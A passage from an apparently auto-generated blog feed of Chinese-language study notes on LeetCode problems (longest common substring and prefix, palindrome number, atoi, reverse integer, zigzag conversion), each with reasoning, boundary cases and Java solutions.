<p>时间复杂度：O(n2)<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LongestCommonSubstring</span></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">longestCommonSubstring</span><span class="params">(String str1,String str2)</span></span>&#123;</span><br><span class="line">		<span class="keyword">int</span> len1 = str1.length();</span><br><span class="line">		<span class="keyword">int</span> len2 = str2.length();</span><br><span class="line">		<span class="keyword">int</span> start = <span class="number">0</span>, len = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len1;i++)&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;len2;j++)&#123;</span><br><span class="line">				<span class="keyword">if</span>(str1.charAt(i)!=str2.charAt(j))</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">int</span> start1 = i+<span class="number">1</span>,start2 = j+<span class="number">1</span>,length = <span class="number">1</span>;</span><br><span class="line">				<span class="keyword">while</span>(start1&lt;len1 &amp;&amp; start2&lt;len2)&#123;</span><br><span class="line">					<span class="keyword">if</span>(str1.charAt(start1)==str2.charAt(start2))&#123;</span><br><span class="line">						start1++;</span><br><span class="line">						start2++;</span><br><span class="line">						length++;</span><br><span class="line">					&#125;<span class="keyword">else</span></span><br><span class="line">						<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">if</span>(length&gt;len)&#123;</span><br><span class="line">					start = start1-length;</span><br><span class="line">					len = length;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> str1.substring(start,start+len);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h1 id="DP问题"><a href="#DP问题" class="headerlink" title="DP问题"></a>DP问题</h1><blockquote>
<p>转换成DP问题，当前字串满足最长子串的前提是字串(n-1)满足最长子串&amp;&amp;当前字符相等。<br><br>  动态转移方程为：</p>
</blockquote>
<pre><code>如果xi == yj， 则 c[i][j] = c[i-1][j-1]+1

如果xi ! = yj,  那么c[i][j] = 0
</code></pre><p>时间复杂度：O(n2)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LongestCommonSubstring3</span></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String []args)</span></span>&#123;</span><br><span class="line">		System.out.println(</span><br><span class="line">			longestCommonSubstring(<span class="string">""</span>,<span class="string">"saabcs"</span>));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">longestCommonSubstring</span><span class="params">(String str1,String str2)</span></span>&#123;</span><br><span class="line">		<span class="keyword">int</span> len1 = str1.length()+<span class="number">1</span>;</span><br><span class="line">		<span class="keyword">int</span> len2 = str2.length()+<span class="number">1</span>;</span><br><span class="line">		<span class="keyword">int</span> r[][] = <span class="keyword">new</span> <span class="keyword">int</span>[len1][len2];</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> m=<span class="number">0</span>;m&lt;len1;m++)</span><br><span class="line">			r[m][<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> n=<span class="number">0</span>;n&lt;len2;n++)</span><br><span class="line">			r[<span class="number">0</span>][n] = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">int</span> start = <span class="number">0</span>,length = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;len1;i++)&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;len2;j++)&#123;</span><br><span class="line">				<span class="keyword">if</span>(str1.charAt(i-<span class="number">1</span>)==(str2.charAt(j-<span class="number">1</span>)))</span><br><span class="line">					r[i][j] = r[i-<span class="number">1</span>][j-<span class="number">1</span>]+<span class="number">1</span>;</span><br><span class="line">				<span class="keyword">if</span>(r[i][j] &gt; length)&#123;</span><br><span class="line">					start = i-length-<span class="number">1</span>;</span><br><span class="line">					length = r[i][j];</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> str1.substring(start,start+length);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>练习下动态规划的思路！</p>
]]></content>
      <tags>
        <tag>LeetCode-easy</tag>
        <tag>Optimize(优化)</tag>
        <tag>DP(动态规划)</tag>
      </tags>
  </entry>
  <entry>
    <title>14. Longest Common Prefix</title>
    <url>/2017/01/19/14-Longest-Common-Prefix/</url>
    <content><![CDATA[<p>Write a function to find the longest common prefix string amongst an array of strings.</p>
<a id="more"></a>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><h2 id="Brute-Forced"><a href="#Brute-Forced" class="headerlink" title="Brute Forced"></a>Brute Forced</h2><blockquote>
<p>我的思路是做加法，每遍历一次字符串数组，就把最长前缀索引+1，直到某一个字符串不存在最长前缀为止。<br><br>这个太费时了，不做这种笨方法。<br><br>需要一个最长前缀索引，然后再遍历所有字符串，如果所有都存在相同的子字符串，则最长前缀索引+1，直到有字符串不包含这个最长前缀字符串，则返回。<br><br>那这个时间复杂度最坏情况下O(n*str.length)</p>
</blockquote>
<h2 id="Optimized（优化）"><a href="#Optimized（优化）" class="headerlink" title="Optimized（优化）"></a>Optimized（优化）</h2><blockquote>
<p>讲真的，我还真没什么想法，看了解答，恍然大悟。<br>最好的思路是做减法：<br></p>
<ol>
<li>假设第一个字符串就是最长前缀，那么遍历字符串数组；</li>
<li>如果，后续的字符串长度小于最长前缀，那么这个最长前缀应该减1；</li>
<li>如果，字符串存在最小前缀，则应该继续检查字符串数组。这里有个很大的优势，如果，后续的字符串不符合最长前缀了，那么，不会影响到前面的判断，因为做的是减法（也就是b∈c的问题，最长前缀总是满足最短的原则）。</li>
<li>那么，如果不存在，则只需要对最长前缀字符串做减法即可。<br></li>
<li>已经得到最长前缀索引，返回即可。</li>
</ol>
<p>这个题很巧妙的利用了减法的思想。<br><br>如果正着查找，那么需要知道每一个字串是否都存在于每一个字符串，如果存在，则在向后加一个字符，在比较。如果用这种减法的思路：先假设一个最长的前缀，如果不存在，应该减小这个最长前缀；如果存在，则应该对后面的字符串继续判断。好处很直观：</p>
<ol>
<li>只需要遍历一次字符串数组；</li>
<li>时间复杂度O(n+strs[0].length)。</li>
</ol>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">longestCommonPrefix</span><span class="params">(String[] strs)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(strs.length == <span class="number">0</span> || strs[<span class="number">0</span>].length()==<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">        String  pre = strs[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">int</span> hi = pre.length();</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(i&lt;strs.length &amp;&amp; hi&gt;<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(strs[i].length()&lt;hi)</span><br><span class="line">                hi--;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(strs[i].substring(<span class="number">0</span>,hi).equals(pre.substring(<span class="number">0</span>,hi)))</span><br><span class="line">                i++;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                hi--;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(hi);</span><br><span class="line">        <span class="keyword">return</span> pre.substring(<span class="number">0</span>,hi);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>利用indexOf方法</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">longestCommonPrefix</span><span class="params">(String[] strs)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(strs.length == <span class="number">0</span> || strs[<span class="number">0</span>].length()==<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">        String  pre = strs[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;strs.length;i++)</span><br><span class="line">            <span class="keyword">while</span>(strs[i].indexOf(pre.substring(<span class="number">0</span>,pre.length()))!=<span class="number">0</span>)</span><br><span class="line">                pre = pre.substring(<span class="number">0</span>,pre.length()-<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> pre;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Boundary-Check"><a href="#Boundary-Check" class="headerlink" title="Boundary Check"></a>Boundary Check</h2><ol>
<li>字符串数组为0或者第一个字符串为0，应该返回空字符串。</li>
<li>最长前缀为空或者遍历完字符串数组时结束。</li>
</ol>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><blockquote>
<p>利用了减法的思想来解决最长前缀问题。</p>
</blockquote>
<p>P.S.</p>
<h1 id="Longest-Common-Substring"><a href="#Longest-Common-Substring" class="headerlink" title="Longest Common Substring"></a><a href="https://war3cdota.github.io/2017/01/22/Longest-Common-Substring/">Longest Common Substring</a></h1>]]></content>
      <tags>
        <tag>LeetCode-easy</tag>
        <tag>Optimize(优化)</tag>
        <tag>减法思维</tag>
      </tags>
  </entry>
  <entry>
    <title>9. Palindrome Number</title>
    <url>/2017/01/10/9-Palindrome-Number/</url>
    <content><![CDATA[<p>Determine whether an integer is a palindrome. Do this without extra space.</p>
<a id="more"></a>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><h2 id="简单的字符串比较"><a href="#简单的字符串比较" class="headerlink" title="简单的字符串比较"></a>简单的字符串比较</h2><blockquote>
<p>借助StringBuffer函数的reverse()方法，可以轻松的对字符串反转，在对翻转后的数字和原数字比较，相等则为回文数。</p>
</blockquote>
<h3 id="出现的问题："><a href="#出现的问题：" class="headerlink" title="出现的问题："></a>出现的问题：</h3><blockquote>
<ol>
<li>数字越界问题，通过stringbuffer转换后，可能出现转化后的数字超越了int的范围。</li>
<li>这样做的时间复杂度和空间复杂度是很浪费的，一个字符是占8位，10位数将占到80位，大于int的32位。</li>
</ol>
</blockquote>
<h2 id="直接操作int"><a href="#直接操作int" class="headerlink" title="直接操作int"></a>直接操作int</h2><blockquote>
<p>使用取模操作直接操作int数字，相等即为回文数。</p>
</blockquote>
<h3 id="Optimized"><a href="#Optimized" class="headerlink" title="Optimized"></a>Optimized</h3><blockquote>
<p>不需要全部转化，只需要转化一半数字即可。但是，由于位数的奇偶性质，可能会出现：</p>
<ol>
<li>左右相等；</li>
<li>左右不相等。</li>
</ol>
</blockquote>
<pre><code>12321转化一般得到12 和 123；
1221 转化则得到12 和 12。
</code></pre><blockquote>
<p><strong>解决办法</strong>：同时检查，（左==右） || （左/10 == 右）。</p>
</blockquote>
<h2 id="Boundary-Check"><a href="#Boundary-Check" class="headerlink" title="Boundary Check"></a>Boundary Check</h2><ol>
<li>负数都不是回文数</li>
<li>0是回文数，但是<code>int%0 == 0</code> 的数不是回文数，但如果采用优化的方案。例如1000，得到的对应的判断是0 和 10，会被误判断为true。</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PalindromeNumber</span></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span>&#123;</span><br><span class="line">		System.out.println(isPalindrome(<span class="number">20</span>));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">isPalindrome</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(x&lt;<span class="number">0</span>||(x!=<span class="number">0</span> &amp;&amp; x%<span class="number">10</span>==<span class="number">0</span>)) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">		<span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">while</span>(x&gt;result)&#123;</span><br><span class="line">			result*=<span class="number">10</span>;</span><br><span class="line">			result+=(x%<span class="number">10</span>);</span><br><span class="line">			x/=<span class="number">10</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> (x==result || x==result/<span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><blockquote>
<p>这个题从优化和边界检测两个地方考察。</p>
</blockquote>
]]></content>
      <tags>
        <tag>LeetCode-easy</tag>
        <tag>Optimize(优化)</tag>
        <tag>Boundary Check(边界值检测)</tag>
      </tags>
  </entry>
  <entry>
    <title>8. String2Integer</title>
    <url>/2017/01/10/8-String2Integer/</url>
    <content><![CDATA[<p>Implement atoi to convert a string to an integer.</p>
<p><strong>Hint</strong>: Carefully consider all possible input cases. If you want a challenge, please do not see below and ask yourself what are the possible input cases.</p>
<p><strong>Notes</strong>: It is intended for this problem to be specified vaguely (ie, no given input specs). You are responsible to gather all the input requirements up front.</p>
<a id="more"></a>
<h2 id="需要考虑："><a href="#需要考虑：" class="headerlink" title="需要考虑："></a>需要考虑：</h2><blockquote>
<p>1.前面的空格需要去除，从第一个非空数字开始取，一直到第一个非数字字符为止。<br><br>2.int最大最小值的问题需要考虑。</p>
</blockquote>
<h2 id="Boundary-Check"><a href="#Boundary-Check" class="headerlink" title="Boundary Check"></a>Boundary Check</h2><ol>
<li>当数字超过int范围所报的情况，可以使用比int范围更大的long来解决；</li>
<li>当超过long的范围，应该使用异常检测来解决；</li>
<li><strong>字符串应该被合理的截取，以便可以被正确的转化，即使出现异常，也应该是越界异常。</strong></li>
</ol>
<blockquote>
<p>这个题的特殊情况处理起来还是比较麻烦的：</p>
</blockquote>
<table>
<thead>
<tr>
<th>输入</th>
<th>输出</th>
<th>说明 </th>
</tr>
</thead>
<tbody>
<tr>
<td>“   -123abc”</td>
<td>-123</td>
<td>过滤空格和非数字</td>
<td></td>
</tr>
<tr>
<td>“+-123abc”</td>
<td>0</td>
<td>对于多符号数截取了空字符串</td>
<td></td>
</tr>
<tr>
<td>“+-“</td>
<td>0</td>
<td>同上，返回了空字符串</td>
<td></td>
</tr>
<tr>
<td>“2147483648”</td>
<td>2147483647</td>
<td>超过int最大值，返回int最大值</td>
<td></td>
</tr>
<tr>
<td>“-2147483649”</td>
<td>-2147483648</td>
<td>小于int最小值，返回int最小值</td>
<td></td>
</tr>
<tr>
<td>“9223372036854775808”</td>
<td>“2147483647”</td>
<td>超过了long的最大值，转换时应该try{}catch</td>
<td></td>
</tr>
<tr>
<td>“-9223372036854775809”</td>
<td>-2147483648</td>
<td>小于long最小值，同上</td>
<td></td>
</tr>
</tbody>
</table>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">myAtoi</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">char</span> []c = str.toCharArray();</span><br><span class="line">        <span class="keyword">int</span> start = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(start&lt;c.length)&#123;</span><br><span class="line">            <span class="keyword">if</span>(c[start] == <span class="string">' '</span>)</span><br><span class="line">                start ++;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> end = start;</span><br><span class="line">        <span class="keyword">while</span>(end&lt;c.length)&#123;</span><br><span class="line">            <span class="keyword">if</span>((c[end]==<span class="string">'+'</span> || c[end]==<span class="string">'-'</span>) &amp;&amp; (end&lt;c.length-<span class="number">1</span>&amp;&amp;(c[end+<span class="number">1</span>]&gt;=<span class="string">'0'</span> &amp;&amp; c[end+<span class="number">1</span>]&lt;=<span class="string">'9'</span>)))</span><br><span class="line">                end ++;</span><br><span class="line">            <span class="keyword">if</span>(c[end]&gt;=<span class="string">'0'</span> &amp;&amp; c[end]&lt;=<span class="string">'9'</span>)</span><br><span class="line">                end++;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        String target = str.substring(start,end);</span><br><span class="line">        <span class="keyword">if</span>(target.length()==<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="keyword">long</span> result = Long.parseLong(target);</span><br><span class="line">            <span class="keyword">if</span>(result&lt;Integer.MIN_VALUE)</span><br><span class="line">                <span class="keyword">return</span> Integer.MIN_VALUE;</span><br><span class="line">            <span class="keyword">if</span>(result&gt;Integer.MAX_VALUE)</span><br><span class="line">                <span class="keyword">return</span> Integer.MAX_VALUE;</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">int</span>)result;</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            <span class="keyword">if</span>(str.charAt(<span class="number">0</span>)==<span class="string">'-'</span>)</span><br><span class="line">                <span class="keyword">return</span> Integer.MIN_VALUE;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">return</span> Integer.MAX_VALUE;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="遇到的困难"><a href="#遇到的困难" class="headerlink" title="遇到的困难"></a>遇到的困难</h2><blockquote>
<ol>
<li>对于字符串字符的操作，应该尽可能的转化成char数组操作，效率上高于直接操作字符串；</li>
<li>对于while的使用，以及判断是否存在连续的符号，或者正常的符号添加情况判断。</li>
</ol>
</blockquote>
<p>让我来看：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span>(end&lt;c.length)&#123;</span><br><span class="line">    <span class="keyword">if</span>((c[end]==<span class="string">'+'</span> || c[end]==<span class="string">'-'</span>) &amp;&amp; (end&lt;c.length-<span class="number">1</span>&amp;&amp;(c[end+<span class="number">1</span>]&gt;=<span class="string">'0'</span> &amp;&amp; c[end+<span class="number">1</span>]&lt;=<span class="string">'9'</span>)))</span><br><span class="line">        end ++;</span><br><span class="line">    <span class="keyword">if</span>(c[end]&gt;=<span class="string">'0'</span> &amp;&amp; c[end]&lt;=<span class="string">'9'</span>)</span><br><span class="line">        end++;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里是困扰我一会的判断代码。</p>
]]></content>
      <tags>
        <tag>LeetCode-easy</tag>
        <tag>Boundary Check(边界值检测)</tag>
      </tags>
  </entry>
  <entry>
    <title>7. Reverse Integer</title>
    <url>/2017/01/08/7-Reverse-Integer/</url>
    <content><![CDATA[<p>Reverse digits of an integer.</p>
<p><strong>Example1</strong>: x = 123, return 321<br><br><strong>Example2</strong>: x = -123, return -321</p>
<a id="more"></a>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><h2 id="int转换成字符串解决"><a href="#int转换成字符串解决" class="headerlink" title="int转换成字符串解决"></a>int转换成字符串解决</h2><blockquote>
<p>时间复杂度 :O(n) ；空间复杂度: O(n)<br><br>要点在于String转换为int时，如果此时大于int的最大或最小值，会报NumberFormatException：当应用程序试图将字符串转换成一种数值类型，但该字符串不能转换为适当格式时，抛出该异常。<br><br>可以使用异常捕获，将这种错误出现时：return 0;也即就是出现数字越界，返回0。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyReverseInteger</span></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">reverse</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> tmp = Math.abs(x);</span><br><span class="line">		StringBuffer sb = <span class="keyword">new</span> StringBuffer(tmp+<span class="string">""</span>);</span><br><span class="line">		sb.reverse();</span><br><span class="line">		<span class="keyword">try</span>&#123;</span><br><span class="line">			<span class="keyword">return</span> (x&gt;<span class="number">0</span>?Integer.parseInt(sb.toString()):-Integer.parseInt(sb.toString()));</span><br><span class="line">		&#125;<span class="keyword">catch</span>(NumberFormatException e)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="取模法"><a href="#取模法" class="headerlink" title="取模法"></a>取模法</h2><blockquote>
<p>一个字符占了8位，一个10位数的int值转为String类型占了80位，在空间上开销就很大了。<br><br>直接对int数值取模并获取模值，并拼接是一个好办法。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">reverse</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(x == Integer.MIN_VALUE)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> tmp = Math.abs(x);</span><br><span class="line">        <span class="keyword">long</span> result = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(tmp!=<span class="number">0</span>)&#123;</span><br><span class="line">            result *= <span class="number">10</span>;</span><br><span class="line">            result += tmp%<span class="number">10</span>;</span><br><span class="line">            <span class="keyword">if</span>(result&gt;Integer.MAX_VALUE)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            tmp /= <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> x&gt;<span class="number">0</span>?(<span class="keyword">int</span>)result:-(<span class="keyword">int</span>)result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="考察点："><a href="#考察点：" class="headerlink" title="考察点："></a>考察点：<br></h2><blockquote>
<ol>
<li>负数的取模，应该将负数转为正数，并在返回前将符号加上。<br></li>
<li>边界检测：<br><br>a. 使用long类型作为倒叙存储，如果用int类型作为倒叙存储，转换后数字大于int最大值，将会强制抛弃高位。<br><br>b. 对于输入数字检测，当为最小值Integer.MIN_VALUE，Math.abs()函不会去掉负号，应该直接返回0。</li>
</ol>
</blockquote>
]]></content>
      <tags>
        <tag>LeetCode-easy</tag>
        <tag>Boundary Check(边界值检测)</tag>
        <tag>位运算</tag>
      </tags>
  </entry>
  <entry>
    <title>6. ZigZag Conversion</title>
    <url>/2017/01/06/6-ZigZag-Conversion/</url>
    <content><![CDATA[<p>The string <font color="rgb(199,37,78)">“PAYPALISHIRING”</font> is written in a zigzag pattern on a given number of rows like this: (you may want to display this pattern in a fixed font for better legibility)</p>
<pre><code>P   A   H   N
A P L S I I G
Y   I   R
</code></pre><p>And then read line by line: <font color="rgb(199,37,78)">“PAHNAPLSIIGYIR”</font></p>
<p>Write the code that will take a string and make this conversion given a number of rows:</p>
<pre><code>string convert(string text, int nRows);
</code></pre><p><font color="rgb(199,37,78)">convert(“PAYPALISHIRING”, 3)</font> should return <font color="rgb(199,37,78)">“PAHNAPLSIIGYIR”</font>.</p>
<a id="more"></a>
<h1 id="Brute-Force："><a href="#Brute-Force：" class="headerlink" title="Brute Force："></a>Brute Force：</h1><blockquote>
<p>生成numRows个StringBuffer对象;<br><br>从0~n-1循环添加元素共n个，再从n-2到1循环添加元素共n-2个；<br><br>外层使用while循环，自增通过索引内 i++。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span>(i&lt;str.length)&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;numRows&amp;&amp;i&lt;str.length;j++)</span><br><span class="line">		sb[j].append(str[i++]);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> k=numRows-<span class="number">2</span>;k&gt;<span class="number">0</span>&amp;&amp;i&lt;str.length;k--)</span><br><span class="line">		sb[k].append(str[i++]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>时间复杂度是O(n)。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">convert</span><span class="params">(String s, <span class="keyword">int</span> numRows)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">char</span> c[] = s.toCharArray();</span><br><span class="line">        StringBuffer sb[] = <span class="keyword">new</span> StringBuffer[numRows];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;sb.length;j++)</span><br><span class="line">            sb[j] = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">        <span class="keyword">int</span> low = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(low &lt; c.length)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;numRows &amp;&amp; low&lt;c.length;i++)</span><br><span class="line">                sb[i].append(c[low++]);</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=numRows-<span class="number">2</span>;j&gt;<span class="number">0</span> &amp;&amp; low&lt;c.length;j--)</span><br><span class="line">                sb[j].append(c[low++]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;sb.length;i++)</span><br><span class="line">            sb[<span class="number">0</span>].append(sb[i]);</span><br><span class="line">        <span class="keyword">return</span> sb[<span class="number">0</span>].toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="嵌套指针法："><a href="#嵌套指针法：" class="headerlink" title="嵌套指针法："></a>嵌套指针法：</h1><blockquote>
<p>该方法的精髓在于：建立新的数组存储每一个元素对应的新数组的索引（需要先建立numRows个StringBuffer对象）</p>
</blockquote>
<pre><code>/*n=numRows
Δ=2n-2    0                           2n-2                       4n-4
Δ=        1                     2n-3  2n-1                4n-5   4n-3
Δ=        2               2n-4        2n              4n-4       .
Δ=        .           .               .               .            .
Δ=        .       n+1                 .           3n+1              .
Δ=        n-2 n                       3n-4    3n                 5n-6
Δ=2n-2    n-1                         3n-3                       5n-5
*/
</code></pre><p>其时间复杂度为O(n)。</p>
<p>核心算法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">index[i] = i%(<span class="number">2</span>*numRows-<span class="number">2</span>);</span><br><span class="line"><span class="keyword">if</span>(index[i]&gt;(numRows-<span class="number">1</span>))</span><br><span class="line">	index[i] = (<span class="number">2</span>*numRows-<span class="number">2</span>)-index[i];</span><br><span class="line"></span><br><span class="line"><span class="number">0</span>     <span class="number">6</span></span><br><span class="line"><span class="number">1</span>  <span class="number">5</span>  <span class="number">7</span></span><br><span class="line"><span class="number">2</span>  <span class="number">4</span>  <span class="number">8</span></span><br><span class="line"><span class="number">3</span>     <span class="number">9</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>每6个数为一个循环，可知模数<code>2n-2</code><br><br>但是，斜着上去的那一行算出了<code>补数</code>，需要用模数去减它才可以得到正确的行数。</p>
</blockquote>
<p>找规律：2*n-2，n指一列的长度。 </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">convert</span><span class="params">(String s, <span class="keyword">int</span> numRows)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(numRows == <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> s;</span><br><span class="line">        <span class="keyword">char</span> c[] = s.toCharArray();</span><br><span class="line">        StringBuffer sb[] = <span class="keyword">new</span> StringBuffer[numRows];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;sb.length;i++)</span><br><span class="line">            sb[i] = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">        <span class="keyword">int</span> index[] = <span class="keyword">new</span> <span class="keyword">int</span>[c.length];</span><br><span class="line">        <span 